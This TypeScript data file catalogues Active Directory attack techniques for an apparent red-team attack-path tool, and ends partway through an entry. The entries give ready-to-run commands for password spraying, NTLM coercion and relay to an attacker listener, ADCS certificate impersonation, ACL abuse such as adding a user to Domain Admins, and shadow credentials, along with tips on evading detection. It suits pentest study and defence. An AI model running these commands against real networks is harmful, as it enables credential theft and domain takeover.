import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

/**
 * Expanded AD techniques (web-verified) that connect into the three base
 * chains: extra footholds, ADCS, DACL/ACL abuse, delegations, Kerberos ticket
 * abuse, lateral movement, and a couple of critical CVEs.
 */
export const adAdditionNodes: TechniqueNodeDef[] = [
  {
    id: 'lat-host-foothold',
    label: 'Foothold on the Target Host',
    phase: 'lateral-movement',
    needs: 'local-admin',
    summary: 'A privileged session on the host you moved to.',
    description:
      'A remote-execution transport (PsExec/SMBExec/WMI/DCOM/WinRM/RDP/SSH and friends) lands you an admin or SYSTEM session on the host you moved to. From there you control the host and can loot it.',
    requires: ['Admin/SYSTEM code execution on the remote host from a lateral-movement transport'],
    mitre: mitre('T1021'),
    references: [{ label: 'MITRE ATT&CK, Remote Services (T1021)', url: 'https://attack.mitre.org/techniques/T1021/' }],
  },
  {
    id: 'username-enum-kerbrute',
    label: 'Username Enumeration',
    phase: 'recon',
    needs: 'none',
    summary: 'Validate AD usernames via Kerberos pre-auth, no creds.',
    description:
      'Kerbrute (and similar tools) send AS-REQs with no pre-authentication: existing accounts return KRB5KDC_ERR_PREAUTH_REQUIRED, unknown ones return KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, so valid usernames are confirmed with no credentials and without incrementing bad-password counters (no account lockout). The validated list seeds password spraying and AS-REP roasting.',
    tools: [
      { name: 'Kerbrute', url: 'https://github.com/ropnop/kerbrute' },
      { name: 'nmap krb5-enum-users', url: 'https://nmap.org/nsedoc/scripts/krb5-enum-users.html' },
    ],
    commands: [
      {
        label: 'Enumerate valid usernames (Kerbrute)',
        code: r`kerbrute userenum -d domain.local --dc 10.0.0.1 usernames.txt`,
        lang: 'bash',
      },
      {
        label: 'Enumerate via nmap',
        code: r`nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.LOCAL',userdb=users.txt 10.0.0.1`,
        lang: 'bash',
      },
    ],
    requires: ['Network access to a Domain Controller', 'A candidate username list'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'HackTricks, Password Spraying / Brute Force', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/password-spraying.html' },
      { label: 'The Hacker Recipes, Pre-auth bruteforce', url: 'https://www.thehacker.recipes/ad/movement/kerberos/pre-auth-bruteforce' },
    ],
    opsec: 'Bulk AS-REQ enumeration generates Kerberos pre-auth events (4768) on the DC, but does not increment badPwdCount so it will not lock accounts. High volume is detectable.',
  },
  {
    id: 'rid-cycling',
    label: 'RID Cycling',
    phase: 'recon',
    needs: 'none',
    summary: 'Brute-force RIDs over a null SMB session to list users.',
    description:
      'Where a host permits null or anonymous SMB sessions, the domain SID is recovered and appended with sequential RIDs to resolve account names. This yields a user/computer list with no credentials, feeding spraying and roasting.',
    tools: [
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'impacket lookupsid', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'RID brute via null session', code: r`nxc smb 10.0.0.1 -u '' -p '' --rid-brute 4000`, lang: 'bash' },
      { label: 'Impacket lookupsid (null)', code: r`lookupsid.py 'domain.local/anonymous:@10.0.0.1'`, lang: 'bash' },
    ],
    requires: ['Null/anonymous SMB or RPC access to the DC'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'The Hacker Recipes, MS-RPC recon', url: 'https://www.thehacker.recipes/ad/recon/ms-rpc' },
    ],
    opsec: 'Many LSARPC/LSAT (MS-LSAT) SID-lookup calls (hLsarLookupSids over \\lsarpc) against the DC are visible; modern DCs frequently disable anonymous access (RestrictAnonymous), so this often fails on hardened domains.',
  },
  {
    id: 'anon-ldap-dump',
    label: 'Anonymous LDAP Dump',
    phase: 'recon',
    needs: 'none',
    summary: 'Dump directory objects via an LDAP anonymous/null bind.',
    description:
      'A successful anonymous (null) LDAP bind alone does not grant enumeration: on default AD any search beyond RootDSE fails until fLDAPBlockAnonOps is relaxed (dsHeuristics 7th char = 2 / 0000002), which is NOT the default. The reliable path is any authenticated (even low-privilege) bind, which reads most of the directory; anonymous enumeration of users, groups, and computers is the rarer misconfiguration. Useful for mapping and to feed BloodHound/spraying.',
    tools: [
      { name: 'windapsearch', url: 'https://github.com/ropnop/windapsearch' },
      { name: 'ldapdomaindump', url: 'https://github.com/dirkjanm/ldapdomaindump' },
    ],
    commands: [
      { label: 'Enumerate users via anonymous bind', code: r`windapsearch --dc-ip 10.0.0.1 -U`, lang: 'bash' },
      { label: 'Full dump (low-priv bind)', code: r`ldapdomaindump ldap://10.0.0.1 -u 'domain.local\user' -p pass -o loot/`, lang: 'bash' },
    ],
    requires: ['LDAP reachable', 'Anonymous bind allowed (or any low-priv account)'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'The Hacker Recipes, LDAP recon', url: 'https://www.thehacker.recipes/ad/recon/ldap' },
    ],
    opsec: 'Anonymous LDAP bind is disabled by default on modern AD; success usually indicates legacy/misconfigured DCs. An authenticated low-priv dump blends with normal traffic, but a successful anonymous bind + bulk search is anomalous on a default DC and is a realistic detection point (Directory Service event 1644 / LDAP search auditing / EDR).',
  },
  {
    id: 'rpc-null-enum',
    label: 'RPC Null-Session Enumeration',
    phase: 'recon',
    needs: 'none',
    summary: 'Enumerate users, groups and password policy over a null RPC/SAMR session.',
    description:
      'Where a host allows a null or guest session, MS-RPC hands you domain users, groups, group membership, and the password policy over SAMR + LSARPC (over 135/139/445) with no credentials; shares come from a separate interface, SRVSVC (NetShareEnum). This is the direct counterpart to RID cycling: when enumeration is permitted outright, enumdomusers / querydispinfo return the whole list at once, and getdompwinfo gives the lockout threshold so you can set a safe spray rate. The result feeds spraying and AS-REP roasting.',
    tools: [
      { name: 'rpcclient (Samba)', url: 'https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html' },
      { name: 'impacket samrdump', url: 'https://github.com/fortra/impacket' },
      { name: 'enum4linux-ng', url: 'https://github.com/cddmp/enum4linux-ng' },
    ],
    commands: [
      { label: 'rpcclient null session', code: r`rpcclient -U '' -N 10.0.0.1
# then: enumdomusers ; enumdomgroups ; querydispinfo ; getdompwinfo`, lang: 'bash' },
      { label: 'One-shot enum (impacket / enum4linux-ng)', code: r`samrdump.py 'domain.local/:@10.0.0.1'
enum4linux-ng -A 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['Null or guest session permitted on the DC/host (SAMR/LSARPC over MS-RPC)'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'The Hacker Recipes, MS-RPC recon', url: 'https://www.thehacker.recipes/ad/recon/ms-rpc' },
    ],
    opsec: 'SAMR/LSARPC queries against the DC are visible; modern DCs restrict anonymous access (RestrictAnonymous), so a null session often fails on hardened domains and you fall back to RID cycling or an authenticated bind.',
  },
  {
    id: 'smtp-user-enum',
    label: 'SMTP / Finger User Enumeration',
    phase: 'recon',
    needs: 'none',
    summary: 'Validate usernames via SMTP VRFY/EXPN/RCPT or the finger service.',
    description:
      'Legacy services leak valid usernames with no authentication. An SMTP server often answers VRFY / EXPN / RCPT TO probes differently for real versus unknown local users, and the finger daemon (79) discloses known and logged-in accounts. Either one turns a guessed name list into a validated one and confirms the account-naming convention, which then feeds spraying and online brute-forcing. Common on Linux and appliance mail hosts and legacy Unix.',
    tools: [
      { name: 'smtp-user-enum', url: 'https://github.com/pentestmonkey/smtp-user-enum' },
      { name: 'Metasploit (smtp_enum)', url: 'https://github.com/rapid7/metasploit-framework' },
    ],
    commands: [
      { label: 'SMTP user enum (RCPT / VRFY)', code: r`smtp-user-enum -M RCPT -U users.txt -D domain.local -t 10.0.0.10
# manual: nc 10.0.0.10 25  ->  VRFY root`, lang: 'bash' },
      { label: 'Finger service enum', code: r`finger root@10.0.0.10
finger @10.0.0.10`, lang: 'bash' },
    ],
    requires: ['SMTP (25, sometimes 587/465) or finger (79) reachable; submission ports usually gate commands behind STARTTLS+AUTH so enum there is unreliable', 'VRFY/EXPN/RCPT not disabled on the MTA'],
    mitre: mitre('T1087.001'),
    references: [
      { label: 'HackTricks, Pentesting SMTP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html' },
      { label: 'HackTricks, Pentesting Finger', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-finger.html' },
    ],
    opsec: 'Probes are logged by the mail server; VRFY/EXPN are disabled on most hardened MTAs, so RCPT is harder for admins to disable (the MTA needs it) and is the usual fallback, but it is slower and can be defeated by catch-all/tarpit configs. Otherwise low-noise.',
  },
  {
    id: 'password-spraying',
    label: 'Password Spraying',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Try one common password across many accounts.',
    description:
      'Rather than many passwords against one account (which locks it), spray a single likely password (e.g. Season+Year) across the whole user list. Spraying over Kerberos (AS-REQ pre-auth) is often stealthier than SMB/LDAP (it frequently avoids 4625 logon-failure events) but still increments badPwdCount, so low-and-slow timing under the lockout threshold is essential. A single hit yields valid domain credentials.',
    tools: [
      { name: 'Kerbrute', url: 'https://github.com/ropnop/kerbrute' },
      { name: 'smartbrute', url: 'https://github.com/ShutdownRepo/smartbrute' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Spray via Kerberos', code: r`kerbrute passwordspray -d domain.local --dc 10.0.0.1 users.txt 'Spring2025!'`, lang: 'bash' },
      { label: 'Spray over SMB', code: r`nxc smb 10.0.0.1 -u users.txt -p 'Spring2025!' --continue-on-success`, lang: 'bash' },
    ],
    requires: ['A valid username list', 'Knowledge/guess of the lockout policy'],
    mitre: mitre('T1110.003'),
    references: [
      { label: 'HackTricks, Password Spraying', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/password-spraying.html' },
      { label: 'The Hacker Recipes, Pre-auth bruteforce', url: 'https://www.thehacker.recipes/ad/movement/kerberos/pre-auth-bruteforce' },
      { label: 'The Hacker Recipes, Password policy', url: 'https://www.thehacker.recipes/ad/recon/password-policy' },
    ],
    opsec: 'Each failed bind increments badPwdCount; SMB/NTLM spraying generates 4625 (and 4776 on the DC), LDAP binds generate 4625, while Kerberos pre-auth spraying avoids 4625 and instead surfaces as 4768/4771 on the DC. Read the lockout policy first, throttle to one attempt per account per window, and pause before the threshold.',
  },
  {
    id: 'mitm6-relay',
    label: 'IPv6 DNS Takeover (DHCPv6)',
    phase: 'initial-access',
    needs: 'none',
    summary: 'Spoof DHCPv6/DNS over IPv6, then relay NTLM.',
    description:
      'Windows prefers IPv6 and auto-requests a DHCPv6 lease. mitm6 answers as a rogue DHCPv6 server and becomes the victim\'s DNS; ntlmrelayx then serves a rogue WPAD (-wh) so the victim requests proxy auth, coercing NTLM. The captured auth is relayed to LDAP(S) to grant delegation rights / configure RBCD on the relayed host, yielding SYSTEM there (and a common path to domain compromise) with no credentials.',
    tools: [
      { name: 'mitm6', url: 'https://github.com/dirkjanm/mitm6' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Spoof DHCPv6/DNS for the domain', code: r`mitm6 -d domain.local`, lang: 'bash' },
      { label: 'Relay to LDAPS, set delegation rights', code: r`ntlmrelayx.py -6 -t ldaps://dc01 -wh wpad.domain.local --delegate-access`, lang: 'bash' },
    ],
    requires: ['On the same local network as the victims', 'IPv6 enabled on victims (default)'],
    mitre: mitre('T1557.003'),
    opsec: 'Rogue DHCPv6/DNS and periodic Router Advertisements are noisy and detectable (unexpected DHCPv6 advertisements, sudden IPv6 DNS registration). mitm6 avoids acting as a gateway and uses short TTLs to limit disruption. Use -d to scope to target domains; defenders monitor for unexpected DHCPv6 advertisements.',
    references: [
      { label: 'Fox-IT (Dirk-jan Mollema), mitm6 - compromising IPv4 networks via IPv6 (original disclosure)', url: 'https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/' },
    ],
  },
  {
    id: 'coerced-auth',
    label: 'Coerced Authentication',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Force a machine (or DC) to authenticate to you.',
    description:
      'Authenticated RPC calls force a target, often a Domain Controller, to initiate NTLM auth back to an attacker host. PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), and the multi-method Coercer all trigger this. The coerced auth is then relayed (to LDAP, ADCS web enrollment for ESC8) or captured by a host with unconstrained delegation.',
    tools: [
      { name: 'Coercer', url: 'https://github.com/p0dalirius/Coercer' },
      { name: 'PetitPotam', url: 'https://github.com/topotam/PetitPotam' },
      { name: 'krbrelayx', url: 'https://github.com/dirkjanm/krbrelayx' },
      { name: 'NetExec (coerce_plus)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Multi-method coercion', code: r`Coercer coerce -u user -p pass -t 10.0.0.10 -l 10.0.0.50 -d domain.local`, lang: 'bash' },
      { label: 'PetitPotam (EFSRPC) coercion', code: r`PetitPotam.py -u user -p pass -d domain.local 10.0.0.50 10.0.0.10`, lang: 'bash' },
      { label: 'Check / fire coercion vectors (NetExec coerce_plus)', code: r`nxc smb <target> -u user -p pass -M coerce_plus -o LISTENER=<attacker_ip>`, lang: 'bash' },
    ],
    requires: ['Usually a valid domain account', 'Reachable RPC service (EFSRPC/RPRN/DFSNM) on the target'],
    mitre: mitre('T1187'),
    opsec: 'Coercion RPC calls and the resulting outbound auth to an unusual host are increasingly detected and many vectors are patched. Have your relay/capture listener running first.',
    references: [
      { label: 'HackTricks, Printers Spooler Service Abuse (Coercion)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html' },
      { label: 'Microsoft MSRC, CVE-2021-36942 advisory (PetitPotam / LSA Spoofing)', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942' },
      { label: 'Filip Dragovic (Wh04m1001), DFSCoerce (MS-DFSNM origin)', url: 'https://github.com/Wh04m1001/DFSCoerce' },
    ],
  },
  {
    id: 'adcs-esc1',
    aliases: ['ADCSESC1'],
    label: 'ADCS ESC1 (Arbitrary SAN)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Enroll a cert as any user via Enrollee-Supplies-Subject.',
    description:
      'ESC1 is the most common AD CS misconfiguration: a template with Client Authentication EKU, ENROLLEE_SUPPLIES_SUBJECT enabled, and enrollment open to low-priv users. Request a certificate specifying an arbitrary UPN/SID (e.g. a Domain Admin), then authenticate with it to recover the target NT hash or a TGT. KB5014754 (May 2022) added two separate defenses. A patched CA stamps a SID security extension (szOID_NTDS_CA_SECURITY_EXT) carrying the real enrollee SID into the cert; separately, a DC-side StrongCertificateBindingEnforcement setting controls how strictly the KDC binds a cert to an account (Compatibility since May 2022, Full Enforcement by default from the February 2025 update wave). What decides ESC1 is whether the issued cert carries that extension. Where the CA still omits it (an unpatched CA, or a template or CA suppressed via ESC9/ESC16), the KDC maps the cert by the subject you supply: certipy -sid puts the target SID in the SAN, a strong mapping the KDC honours even under Full Enforcement, while a UPN-only mapping needs Compatibility mode. Where the extension is present it carries your real SID, so a plain ESC1 request authenticates as you, not the target; pivot to an extension-suppressing path (ESC9 per-template, ESC16 CA-wide) to strip it first. One of the ESC1 to ESC8+ family.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Find vulnerable templates', code: r`certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -vulnerable -stdout`, lang: 'bash' },
      { label: 'Request a cert impersonating a target (works pre-patch / Compatibility; blocked under Full Enforcement, pivot to ESC9/ESC16)', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@domain.local -sid <target-objectSid>`, lang: 'bash' },
      { label: 'Authenticate with the cert -> NT hash + TGT', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['A low-priv account with enrollment rights', 'A template vulnerable to ESC1'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },{ label: 'Microsoft, KB5014754: Certificate-based authentication changes on Windows domain controllers (SID security extension + StrongCertificateBindingEnforcement timeline)', url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16' },{ label: 'Schroeder & Christensen (SpecterOps), Certificates and Pwnage and Patches, Oh My! (patch-era ESC1 + SAN SID analysis)', url: 'https://specterops.io/blog/2022/11/09/certificates-and-pwnage-and-patches-oh-my/' },{ label: 'The Hacker Recipes, AD CS', url: 'https://www.thehacker.recipes/ad/movement/adcs/' }],
    opsec: 'If CA success auditing is enabled (off by default; requires the CA Auditing tab + auditpol CertificationServices subcategory), the request is logged as Event ID 4886/4887 and a SAN/UPN that differs from the requester is a strong IOC. Certificates remain valid past password resets.',
  },
  {
    id: 'adcs-esc8',
    aliases: ['CoerceAndRelayNTLMToADCS'],
    label: 'ADCS ESC8 (Relay to Web Enrollment)',
    phase: 'priv-esc',
    needs: 'none',
    summary: 'Relay coerced NTLM to the AD CS web enrollment endpoint.',
    description:
      'ESC8 needs no vulnerable template: the AD CS HTTP web enrollment interface accepts NTLM. Coerce a Domain Controller to authenticate, relay that NTLM to the certsrv endpoint, and obtain a certificate for the DC machine account, which yields a TGT and DCSync. The template must match the relayed principal: DomainController when you relay a DC (as here), a Machine/Computer template for an ordinary computer account, or User for a relayed user. A mismatch is rejected for lack of enrollment rights.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Relay to web enrollment', code: r`ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, lang: 'bash' },
      { label: 'Then coerce the DC to authenticate', code: r`Coercer coerce -u user -p pass -t dc01.domain.local -l 10.0.0.50`, lang: 'bash' },
    ],
    requires: ['AD CS web enrollment enabled (HTTP, no EPA)', 'A coercion vector to a privileged machine'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC8)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },{ label: 'The Hacker Recipes, AD CS web endpoints', url: 'https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints' }],
    opsec: 'Combines coercion (noisy) with relay and a cross-account cert request: multiple high-fidelity detections. Mitigated by EPA / HTTPS-only on certsrv.',
  },
  {
    id: 'acl-group-delegated',
    label: 'Group-Delegated Rights',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Your effective ACEs include every right granted to the groups you are (transitively) in.',
    description:
      "ACEs are frequently granted to a GROUP, not an individual: a help-desk or IT group is delegated ForceChangePassword over a staff OU, a team group gets GenericWrite over its service accounts, a backup group gets rights on servers. As a member you INHERIT those rights even though your own user object holds no ACE on the target. Always enumerate the effective permissions of every group you belong to (transitively, through nesting), not just your account. This is how a low-privilege user ends up holding a powerful control edge; BloodHound resolves it automatically.",
    tools: [
      { name: 'BloodHound', url: 'https://github.com/SpecterOps/BloodHound' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Resolve rights held by you AND your groups (PowerView)', code: r`$sids = @((Get-DomainUser $env:USERNAME).objectsid) + (Get-DomainGroup -MemberIdentity $env:USERNAME).objectsid
Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? { $_.SecurityIdentifier -in $sids }`, lang: 'powershell' },
    ],
    references: [{ label: 'harmj0y, Abusing AD Permissions with PowerView', url: 'https://blog.harmj0y.net/redteaming/abusing-active-directory-permissions-with-powerview/' }],
    requires: ['Membership in a group that holds an ACE over the target'],
    opsec: '-Identity * enumerates security descriptors on every object in the domain (heavy paged LDAP, high event volume on a monitored DC). Prefer scoping with -SearchBase to the OU of interest, or lean on an existing BloodHound collection rather than re-querying live.',
  },
  {
    id: 'acl-dcsync-rights',
    aliases: ['DCSync', 'GetChanges', 'GetChangesAll', 'GetChangesInFilteredSet'],
    label: 'DCSync Rights (DS-Replication)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'A non-DA principal granted replication rights on the domain can DCSync.',
    description:
      'DCSync needs two control-access rights on the domain head: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All. They belong to DCs and Domain/Enterprise Admins, but are frequently delegated to sync/service accounts (Entra Connect, backup, monitoring) or granted via a WriteDACL on the domain object. Any account holding both ACEs replicates secrets, including the krbtgt hash, with no Domain Admin membership.',
    tools: [
      { name: 'BloodHound', url: 'https://github.com/SpecterOps/BloodHound' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Find principals with replication rights (PowerView)', code: r`Get-DomainObjectAcl -SearchBase 'DC=corp,DC=local' -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication-Get-Changes' }`, lang: 'powershell' },
    ],
    mitre: mitre('T1003.006'),
    references: [{ label: 'The Hacker Recipes, DCSync', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync' }, { label: 'ADSecurity (Sean Metcalf), Mimikatz DCSync Usage, Exploitation, and Detection', url: 'https://adsecurity.org/?p=1729' }],
    requires: ['DS-Replication-Get-Changes and Get-Changes-All on the domain object'],
  },
  {
    id: 'acl-genericall',
    label: 'GenericAll',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Full control over an object → the abuse depends on its type.',
    description:
      'GenericAll is full control over a target object: it implies WriteDacl, WriteOwner, every property write, and the control-access rights. The abuse depends on the object TYPE: over a USER, reset the password (ForceChangePassword), write a shadow credential, or set an SPN to Kerberoast; over a GROUP, add a member; over a COMPUTER, configure RBCD or read LAPS; over the DOMAIN object, grant yourself DCSync; over a GPO, edit its settings; over an OU, link a malicious GPO.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add genericAll <target> <attacker>', lang: 'bash' },
      { label: 'Grant yourself GenericAll over a target', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass add genericAll TARGET attacker`, lang: 'bash' },
    ],
    requires: ['GenericAll over a target object from an owned principal'],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound GenericAll edge', url: 'https://bloodhound.specterops.io/resources/edges/generic-all' },{ label: 'The Hacker Recipes, DACL abuse', url: 'https://www.thehacker.recipes/ad/movement/dacl/' }],
    opsec: 'If the DC audits it (Directory Service Changes / Access SACL configured), DACL writes surface as 5136/4662; these are not enabled on most objects by default, so absence of a log is not proof of stealth. Revert added ACEs after use; choose the lowest-noise follow-on the edge allows.',
  },
  {
    id: 'acl-genericwrite',
    label: 'GenericWrite',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: "Write a target's attributes, but NOT its DACL or owner.",
    description:
      "GenericWrite lets you write a target's attributes, but (unlike GenericAll) NOT its DACL or owner, and not the control-access rights. So it grants NO DCSync and NO password reset; instead you abuse specific writable attributes: set an SPN to Kerberoast, flip DONT_REQ_PREAUTH for AS-REP roasting, write msDS-KeyCredentialLink for shadow credentials, write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD (over a computer), set scriptPath for a logon script, write a group's member attribute, write msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) to read the gMSA password, or edit a GPO you control.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Set an SPN on a target user (→ Kerberoast)', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass set object TARGET servicePrincipalName -v 'HOST/x'`, lang: 'bash' },
      { label: 'Add a shadow credential', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass add shadowCredentials TARGET`, lang: 'bash' },
    ],
    requires: ['GenericWrite (or WriteProperty on a specific attribute) over the target'],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound GenericWrite edge', url: 'https://bloodhound.specterops.io/resources/edges/generic-write' },
    ],
    opsec: 'Attribute writes log 4662/5136 where directory-service-changes auditing / object SACLs are enabled. Shadow credentials and SPN-set are quieter than a password reset and easily reverted, so prefer them (shadow credentials need a PKINIT-capable DC, Server 2016+ with a KDC cert; on a domain without PKINIT support the abuse fails, so fall back to a reset).',
  },
  {
    id: 'acl-forcechangepassword',
    label: 'ForceChangePassword',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: "Reset a target user's password without the old one.",
    description:
      'The User-Force-Change-Password extended right lets you set a target user password without knowing the current one. Reset it, then log in as that user: a direct identity takeover, often the cheapest edge from a low-priv user to a privileged account.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 set password <target> \'NewPass123!\'', lang: 'bash' },
      { label: 'Force-reset the target password', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass set password TARGET 'Newp@ss123!'`, lang: 'bash' },
    ],
    requires: ['ForceChangePassword (or GenericAll) over the target user'],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound ForceChangePassword edge', url: 'https://bloodhound.specterops.io/resources/edges/force-change-password' },{ label: 'The Hacker Recipes, DACL abuse', url: 'https://www.thehacker.recipes/ad/movement/dacl/' }],
    opsec: 'A password reset is auditable (Event ID 4724) and denies the legitimate user access (their old password no longer works), often generating a helpdesk ticket. Prefer shadow credentials or targeted Kerberoast when stealth matters.',
  },
  {
    id: 'acl-addself-group',
    aliases: ['AddMember', 'AddSelf'],
    label: 'AddSelf / AddMember to Group',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Add yourself to a privileged group.',
    description:
      'With Self-Membership (AddSelf), GenericWrite/GenericAll, or WriteProperty on a group member attribute, add your principal to it. If the group is privileged (e.g. Domain Admins, or one nested into it), you inherit its rights on your next logon (after refreshing your Kerberos ticket / access token; an existing session will not reflect the new membership).',
    tools: [{ name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' }],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add groupMember <group> <attacker>', lang: 'bash' },
      { label: 'Add a member to a target group', code: r`bloodyAD -H 10.0.0.1 -d domain.local -u user -p pass add groupMember 'Domain Admins' attacker`, lang: 'bash' },
    ],
    requires: ['AddSelf / write-member right over a privileged group'],
    mitre: mitre('T1098.007'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound AddSelf edge', url: 'https://bloodhound.specterops.io/resources/edges/add-self' },{ label: 'The Hacker Recipes, DACL abuse', url: 'https://www.thehacker.recipes/ad/movement/dacl/' }],
    opsec: 'The addition itself persists; SDProp will not undo it (it only restamps inherited ACLs on protected objects, it does not remove group membership). The real signal is the 4728 (global group, e.g. Domain Admins) / 4756 (universal group) event on the DC, and defenders may alert on and manually roll back membership of protected groups. Remove yourself promptly.',
  },
  {
    id: 'shadow-credentials',
    aliases: ['AddKeyCredentialLink', 'WriteKeyCredentialLink'],
    label: 'Shadow Credentials',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Write msDS-KeyCredentialLink -> PKINIT as the target.',
    description:
      'With write rights over a target msDS-KeyCredentialLink (via GenericWrite/GenericAll), add an attacker-controlled key credential, then authenticate via PKINIT to obtain a PKINIT TGT (and, via UnPAC-the-Hash, the target NT hash): no password reset, and easily reverted. It works ONLY where the domain supports PKINIT, which requires AD CS deployed (an enterprise CA issuing the KDC/DC certificate); with no CA in the domain there is nothing to authenticate against, so fall back to Targeted Kerberoasting for the same GenericWrite.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'pyWhisker', url: 'https://github.com/ShutdownRepo/pywhisker' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add shadowCredentials <target>', lang: 'bash' },
      { label: 'Auto add/auth/cleanup (Certipy)', code: r`certipy shadow auto -u user@domain.local -p pass -account TARGET -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: 'Add a key credential (pyWhisker)', code: r`pywhisker -d domain.local -u user -p pass --target TARGET --action add`, lang: 'bash' },
    ],
